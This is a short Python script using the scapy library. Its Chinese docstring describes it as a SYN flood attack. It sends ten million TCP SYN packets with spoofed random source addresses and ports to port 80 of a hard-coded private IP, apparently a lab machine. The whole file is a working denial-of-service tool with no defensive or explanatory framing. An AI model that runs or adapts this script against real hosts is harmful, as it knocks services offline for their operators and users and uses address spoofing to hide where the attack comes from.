# -*- coding: utf-8 -*-
#  @ Date   : ${DATE} ${TIME}
#  @ Author : RichardLau_Cx
#  @ Project: ${PROJECT_NAME}
#  @ File   : ${FILE_NAME}
#  @ IDE    : ${PRODUCT_NAME}


# from telnetlib import IP

from scapy.all import *
import random

from scapy.layers.inet import TCP, IP

"""
    需要安装Winpcap/Npcap软件配合使用，实现SYN泛洪攻击
"""


def synFlood():
    for i in range(10000000):
        # 构造随机的源IP
        src = '%i.%i.%i.%i' % (
            random.randint(1, 255),
            random.randint(1, 255),
            random.randint(1, 255),
            random.randint(1, 255)
        )
        # 构造随机的端口
        sport = random.randint(1024, 65535)
        IPlayer = IP(src=src, dst='192.168.137.96')
        TCPlayer = TCP(sport=sport, dport=80, flags="S")
        packet = IPlayer / TCPlayer
        send(packet)


if __name__ == '__main__':
    synFlood()